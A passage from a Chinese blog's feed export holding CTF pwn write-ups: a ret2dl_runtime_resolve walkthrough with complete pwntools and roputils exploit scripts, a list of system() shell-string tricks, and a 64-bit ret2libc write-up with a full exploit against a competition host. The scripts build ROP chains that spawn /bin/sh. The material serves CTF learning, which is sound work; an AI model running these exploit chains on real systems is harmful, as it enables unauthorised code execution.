结尾的字符串。<br>sh_type |根据节的内容和语义进行分类，具体的类型下面会介绍。<br>sh_flags |每一比特代表不同的标志，描述节是否可写，可执行，需要分配内存等属性。<br>sh_addr |如果节区将出现在进程的内存映像中，此成员给出节区的第一个字节应该在进程镜像中的位置。否则，此字段为 0。<br>sh_offset |给出节区的第一个字节与文件开始处之间的偏移。SHT_NOBITS 类型的节区不占用文件的空间，因此其 sh_offset|成员给出的是概念性的偏移。<br>sh_size |此成员给出节区的字节大小。除非节区的类型是 SHT_NOBITS ，否则该节占用文件中的 sh_size 字节。类型为SHT_NOBITS 的节区长度可能非零，不过却不占用文件中的空间。<br>sh_link |此成员给出节区头部表索引链接，其具体的解释依赖于节区类型。<br>sh_info |此成员给出附加信息，其解释依赖于节区类型。<br>sh_addralign |某些节区的地址需要对齐。例如，如果一个节区有一个 doubleword 类型的变量，那么系统必须保证整个节区按双字对齐。也就是说，$sh_addr % sh_addralign$=0。目前它仅允许为 0，以及 2 的正整数幂数。 0 和 1 表示没有对齐约束。<br>sh_entsize|某些节区中存在具有固定大小的表项的表，如符号表。对于这类节区，该成员给出每个表项的字节大小。反之，此成员取值为0。<br>sh_addr就是取这个地址，取进程镜像中的地址</p><h3 id="接下来是重点了"><a href="#接下来是重点了" class="headerlink" title="接下来是重点了"></a>接下来是重点了</h3><ul><li>如果这部分不理解，你就。。。</li><li>其实还是可以做这道题的，因为这是原理部分内容，完全可以复制黏贴一把梭，不用理解</li><li>不过做题图个啥，不就是懂这个原理嘛，接下来仔细解释下如何构造</li></ul><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line"><span class="comment">#对齐</span></span><br></pre></td></tr></table></figure><p>接下来就是真正的构造部分了，我先构造dynsym内容的地址，我将base_stage + 32作为system函数的偏移地址，也就是说，我知道了dynstr的system地址了，<strong>但我这随便取的base_stage + 32 有可能相对于dynsym不是个标准地址</strong> 什么叫标准地址，他的每个结构体都是16个字节，也就是说他的地址都是对齐的，我可能相对于他不是刚好一个对齐的地址，所以我这里需要对齐一下，利用我对齐上面部分的代码就可以进行对齐了。解释下：<br>假设内存布局是这样的</p><p>0x8048a00 11111111 22222222 33333333 44444444 dynsym起始位置<br>0x8048a10 11111111 22222222 33333333 44444444<br>0x8048a20 11111111 22222222 33333333 44444444<br>0x8048a30 11111111 22222222 33333333 44444444<br>0x8048a40 11111111 22222222 33333333 44444444<br>0x8048a50 11111111 22222222 33333333 44444444<br>0x8048a60 11111111 22222222 33333333 44444444<br>0x8048a70 11111111 22222222 33333333 44444444<br>0x8048a80 11111111 22222222 33333333 44444444</p><p>我base_stage + 32可能在这4个部分的任意位置，但这样是不行的，他的结构体只能从开头开始，所以我需要取他的这段开头的地址</p><ul><li>假设我在第3部分，第一个3的位置，那我base_stage + 32就是0x8048a88</li><li>利用上面那个计算方式就是0x10 - ((0x8048a88 - 0x8048a00) &amp; 0xf) = 0x10 - 0x8 = 0x8</li><li>故我的地址在加上align后就变成0x8048a90刚好是对齐了</li></ul><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_dynsym = (fake_sym_addr - dynsym)/<span class="number">0x10</span></span><br><span class="line">r_info = index_dynsym &lt;&lt; <span class="number">8</span> | <span class="number">0x7</span></span><br><span class="line">read_got = elf.got[<span class="string">'setvbuf'</span>]</span><br><span class="line">fake_sys_rel = flat([read_got, r_info])</span><br><span class="line"><span class="comment">#构造.rel.plt表</span></span><br></pre></td></tr></table></figure><ul><li>然后利用这个对齐后的地址开始构造，我可以求出他在.rel.plt表中的偏移,别忘了，我当初说过的，这是相对偏移，所以我们要求r_info也是相对偏移，</li><li>先通过( fake_sym_addr - dynsym(基地址) )/0x10,求出偏移</li><li>然后再在这个地址后面添加上07标识，表示这个函数是导入函数，所以就变成了,左移8位就是增加一个字节，两位二进制位， |7相当于加7</li><li>然后我们需要一个地址进行写入，以后调用跳到这个表的函数就会直接去到函数的真实地址了，不过这里我们只需调用一次，不需要二次调用，所以地址可以随便写，当然，要可写的地址。。。我取了setvbuf的got表，然后将他做成个结构体</li><li>flat([])就是将里面的全变成字符</li></ul><h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">st_name = fake_sym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">fake_sys = flat([st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br></pre></td></tr></table></figure><ul><li>构造dynsym表里的结构体，如果你不记得他具体结构是什么，往上翻一下，我们需要伪造的只有第一项跟第四项，其余为0，第一项为st_name，也就是符号的具体偏移位置，第四项标识为导入函数</li><li>这里我将fake_sym_addr + 0x10作为’system\x00’的地址，然后求出相对偏移，然后将他构造成一个结构体</li></ul><h4 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br></pre></td></tr></table></figure><p>这部分是最后的了，这个偏移就是拿来寻找.rel.plt表的<br>构造完后，我们需要构造ROP链了</p><h3 id="ROP链的构造"><a href="#ROP链的构造" class="headerlink" title="ROP链的构造"></a>ROP链的构造</h3><p>说实话，我好几次看这个ROP链，我都被绕晕了，搞了好几次才完全理解，忘了结构体的原因，建议不要跟博主一样这样命名，结构体最后加个fake_sys_struct这样的，方便看</p><h4 id="第一部分-1"><a href="#第一部分-1" class="headerlink" title="第一部分"></a>第一部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">sh = <span class="string">'/bin/sh'</span></span><br></pre></td></tr></table></figure><ul><li>初始化ROP链和参数<h4 id="第二部分-1"><a href="#第二部分-1" class="headerlink" title="第二部分"></a>第二部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br></pre></td></tr></table></figure></li><li>先plt0，我已经说过了，调用那部分地址，才能利用_dl_runtime_resolve</li><li>然后传入偏移,32位是用栈传参的，也就是这样</li><li>如果是64位，这里还得调整下，先利用pop将参数弄到寄存器里，在调用plt0</li></ul><h4 id="第三部分-1"><a href="#第三部分-1" class="headerlink" title="第三部分"></a>第三部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(base_stage+<span class="number">82</span>)</span><br></pre></td></tr></table></figure><ul><li>bbbb为返回地址</li><li>base-stage + 82 为函数参数，这个函数是我们最后将程序控制权交给他的函数，本题里也就是system函数<br>这里具体为什么是这里，你可以从gdb调试看出来，他里面<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disassemble _dl_runtime_resolve</span><br><span class="line">Dump of assembler code for function _dl_runtime_resolve:</span><br><span class="line">=&gt; 0xf7f7e6c0 &lt;+0&gt;:	push   eax</span><br><span class="line">   0xf7f7e6c1 &lt;+1&gt;:	push   ecx</span><br><span class="line">   0xf7f7e6c2 &lt;+2&gt;:	push   edx</span><br><span class="line">   0xf7f7e6c3 &lt;+3&gt;:	mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line">   0xf7f7e6c7 &lt;+7&gt;:	mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line">   0xf7f7e6cb &lt;+11&gt;:	call   0xf7f78ac0 &lt;_dl_fixup&gt;</span><br><span class="line">   0xf7f7e6d0 &lt;+16&gt;:	pop    edx</span><br><span class="line">   0xf7f7e6d1 &lt;+17&gt;:	mov    ecx,DWORD PTR [esp]</span><br><span class="line">   0xf7f7e6d4 &lt;+20&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0xf7f7e6d7 &lt;+23&gt;:	mov    eax,DWORD PTR [esp+0x4]</span><br><span class="line">   0xf7f7e6db &lt;+27&gt;:	ret    0xc</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2wcup4ilbj30yw0md7d6.jpg" alt="4"></li><li>从上图可以看出，他直接将栈迁移到了system函数那里，看到这里不由得佩服前人们，研究出了这些攻击方法，然后后面又提高了栈， ret 0xc平衡堆栈过后就刚好对应上了<br>看参数<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2wcuukgx1j30xq0p8ti8.jpg" alt="5"></li><li>这里arg[0]就是返回地址，</li><li>arg[1]就是参数了</li><li>符合了原来的说法，调用完dl_runtime_resolve后将程序控制权交给解析出来的函数。。我先把后面的过程讲了，我在绕回来讲表吧</li></ul><h4 id="第四部分-1"><a href="#第四部分-1" class="headerlink" title="第四部分"></a>第四部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br></pre></td></tr></table></figure><ul><li>进行填充，使位置达到base_stage + 24</li></ul><h4 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(fake_sys_rel)</span><br></pre></td></tr></table></figure><ul><li>填入.rel.plt里的一个结构体，用于解析函数</li></ul><h4 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(align * <span class="string">'a'</span>)</span><br></pre></td></tr></table></figure><ul><li>填充对齐部分<h4 id="第七部分"><a href="#第七部分" class="headerlink" title="第七部分"></a>第七部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(fake_sys)</span><br></pre></td></tr></table></figure></li><li>这里填入的是一个结构体，大小为0x10，fake_sys-&gt;st_name后去找我们的dynstr，这里st_name构造的就是这里地址在加0x10，所以这个结构体过后就是system字符串地址了</li></ul><h4 id="第八部分"><a href="#第八部分" class="headerlink" title="第八部分"></a>第八部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(<span class="string">'system\x00'</span>)</span><br></pre></td></tr></table></figure><h4 id="第九部分"><a href="#第九部分" class="headerlink" title="第九部分"></a>第九部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">80</span> - len(rop.chain())))</span><br><span class="line"><span class="keyword">print</span> len(rop.chain())</span><br></pre></td></tr></table></figure><ul><li>这里打印出来是82,rop链的自动对齐，所以接下来是参数内容/bin/sh<h4 id="第十部分"><a href="#第十部分" class="headerlink" title="第十部分"></a>第十部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(sh+<span class="string">'\x00'</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">100</span> - len(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><p>完整构造就这样完成了，接下来直接打就能成功了。<br>先贴上完整exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">io = process(<span class="string">'./pwn'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">'a'</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym)/<span class="number">0x10</span></span><br><span class="line">st_name = fake_sym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">fake_sys = flat([st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br><span class="line">read_got = elf.got[<span class="string">'setvbuf'</span>]</span><br><span class="line">r_info = index_dynsym &lt;&lt; <span class="number">8</span> | <span class="number">0x7</span></span><br><span class="line">fake_sys_rel = flat([read_got, r_info])</span><br><span class="line">sh = <span class="string">'/bin/sh'</span></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(base_stage+<span class="number">82</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">rop.raw(fake_sys_rel)</span><br><span class="line">rop.raw(align * <span class="string">'a'</span>)</span><br><span class="line">rop.raw(fake_sys)</span><br><span class="line">rop.raw(<span class="string">'system\x00'</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">80</span> - len(rop.chain())))</span><br><span class="line"><span class="keyword">print</span> len(rop.chain())</span><br><span class="line">rop.raw(sh+<span class="string">'\x00'</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">100</span> - len(rop.chain())))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>终于写完了这道题。。。不过好像跟我标题好像不太符合啊，通杀，如何通杀。。。</p><h2 id="通杀"><a href="#通杀" class="headerlink" title="通杀"></a>通杀</h2><ul><li>其实这种类型题中间的构造部分完全可以不理，也就是rop链构造和表得到构造部分，你可以直接复制黏贴中间部分拿去打别的题目，也是能成功的，我测试了xctf2015的那道题，也就是ctf-wiki例题，以及iscc2019的题目都是一个套路</li><li>其实还有集成工具利用，叫roputils,这个也是一个库，专门用于对付ret2dllruntime</li><li>理解过后，这种题你会发觉很简单，因为利用方式单一，根本没有啥骚姿势学习了，都是一样的套路了</li></ul><p><strong>接下来贴下roputils的利用方法，我根本没改什么，就是ctf-wiki的工具使用方法，改几个参数就行，我将需要改的参数提放到前面了</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">'pwn'</span></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./'</span> + processName)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">rop = ROP(<span class="string">'./'</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>是不是发觉精简好多，几乎不用写啥，我感觉这种题就是这样，原理难理解点，解题很简单，以后比赛遇到这种题，就拿这个exp改下offset和程序名，一波梭，有时候需要手动迁移下栈而已</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ul><li>以后遇到高级ROP这种题就一把梭了</li><li>妈妈在也不用担心我遇到栈的这种问题了</li><li>我只分析了32位程序的这种题，64位题目的结构和大小也改了，不用利用工具也可以方便的搞定，具体自行尝试了</li></ul><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/a606db69/">https://noone-hub.github.io/posts/a606db69/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn细节</title>
    <url>/posts/aaf99047/</url>
    <content><![CDATA[<ol><li>system(“/bin/sh”)</li><li>system(“sh”)</li><li>system(“/bin/bash”)</li><li>system(“bash”)</li><li>system(“$0”)</li></ol><p>若还不成，可试试在参数后面加;#<br>比如system(“/bin/sh;#”)<br>这是由于函数的特殊性，有些函数会截断特殊字符</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/aaf99047/">https://noone-hub.github.io/posts/aaf99047/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 细节</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛pwn01</title>
    <url>/posts/2bb7fa87/</url>
    <content><![CDATA[<h1 id="pwn-01"><a href="#pwn-01" class="headerlink" title="pwn-01"></a>pwn-01</h1><p>题目不难，很明显能看出ROP</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your Plaintext to be encrypted"</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ciphertext"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>gets没有限制长度，然后有个麻烦的地方就是对payload进行了一轮加密操作，然后过了这部分后，还要记住他是64位程序，用寄存器传前5个还是前6个参数来着，忘了，不重要，不过确定的是第一位是用的rdi，所以需要<br>ROPgadget –binary Emachine –only ‘pop|ret’<br>然后找到那个地址</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">└──╼ <span class="variable">$ROPgadget</span> --binary Emachine --only <span class="string">'pop|ret'</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c80 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c82 : pop r15 ; ret</span><br><span class="line">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007f0 : pop rbp ; ret</span><br><span class="line">0x0000000000400aec : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br><span class="line">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 15</span><br></pre></td></tr></table></figure><p>然后加密部分在加密一次就完了，异或加密可逆</p><h2 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(payload)):</span><br><span class="line">        <span class="keyword">if</span> ord(payload[x]) &lt;= <span class="number">96</span> <span class="keyword">or</span> ord(payload[x]) &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> ord(payload[x]) &lt;=<span class="number">64</span> <span class="keyword">or</span> ord(payload[x]) &gt; <span class="number">90</span>:</span><br><span class="line">                <span class="keyword">if</span> ord(payload[x]) &gt; <span class="number">47</span> <span class="keyword">and</span> ord(payload[x]) &lt;= <span class="number">57</span>:</span><br><span class="line">                    result += chr(ord(payload[x]) ^ <span class="number">0xf</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    result += payload[x]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += chr(ord(payload[x]) ^ <span class="number">0xe</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += chr(ord(payload[x]) ^ <span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="初始化部分"><a href="#初始化部分" class="headerlink" title="初始化部分"></a>初始化部分</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset = <span class="number">0x50</span> + <span class="number">8</span></span><br><span class="line"><span class="comment">#io = process("./Emachine")</span></span><br><span class="line">io = remote(<span class="string">"172.29.14.110"</span>, <span class="number">8888</span>)</span><br><span class="line">elf = ELF(<span class="string">'./Emachine'</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">__libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">start = <span class="number">0x0000000000400B28</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">__libc_start_main_plt = elf.plt[<span class="string">'__libc_start_main'</span>]</span><br></pre></td></tr></table></figure><p>初始化部分，offset是0x58，本地是和远程libc不一样</p><h2 id="主函数部分"><a href="#主函数部分" class="headerlink" title="主函数部分"></a>主函数部分</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> hex(puts_plt)</span><br><span class="line">    <span class="keyword">print</span> hex(__libc_start_main_got)</span><br><span class="line">    <span class="keyword">print</span> hex(__libc_start_main_plt)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#encrypt</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    payload = p64(__libc_start_main_got<span class="number">-1</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*offset +  p64(pop_rdi) + p64(__libc_start_main_got<span class="number">-1</span>) + p64(puts_plt) +  p64(<span class="number">0x0000000000400B28</span>) </span><br><span class="line">    payload = Decrypt(payload)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">"Ciphertext\n"</span>)</span><br><span class="line">    <span class="comment">#print "io.recv =" + io.recv()</span></span><br><span class="line">    <span class="comment">#io.sendline("1")</span></span><br><span class="line">    <span class="comment">#result = io.recvuntil("\nE", drop= True)[-8:]</span></span><br><span class="line">    result = io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    result = io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    result = u64(result[:<span class="number">-1</span>]+p8(<span class="number">0</span>)+p8(<span class="number">0</span>))</span><br><span class="line">    <span class="comment">#泄露libc地址</span></span><br><span class="line">    <span class="keyword">print</span> hex(result)</span><br><span class="line"></span><br><span class="line">    __libc_start_main_addr = result</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">'a'</span>*offset  + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) </span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="comment">#print "addr " + hex(u64(io.recv(8)))</span></span><br><span class="line">    <span class="comment">#print hex(u64(io.recv(8)))</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">#print len(io.recv(8))</span></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p>直接把payload 进行一次加密就完了，然后进行正常的ROP就完了，pop_rdi, 将__libc_start_got pop到rdi里，然后puts就是puts got，然后返回地址就是0x0000000000400B28<br>泄露过后，我这里进行调试了很多遍，才知道如何接受那个字符串，就是泄露的libc_start_main地址</p><p>接受成功后，就是在pop bin_sh 然后执行system函数就完了，</p><p>现在写writeup的时候，发觉有更简单的办法，加密函数根本不用管，我原来错的只是寄存器传参的问题，因为我发觉我后面传payload的时候忘了加密也成了。。。。<br>所以。。。原来是简单题，被我做复杂了。。。<br>只是一个在简单不过的ret2libc??</p><p>还有个内网我无法下载libc。。。幸亏我特么本机存了ctf-wiki的libc，那个题目的libc直接打成了是libc2.23.so<br>好像后面的题目也给了libc，直接下载也成吧<br>以后要正确区分64位程序跟32位程序区别，这次踩了好久的坑</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/2bb7fa87/">https://noone-hub.github.io/posts/2bb7fa87/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛pwn修复1</title>
    <url>/posts/ce5ca923/</url>
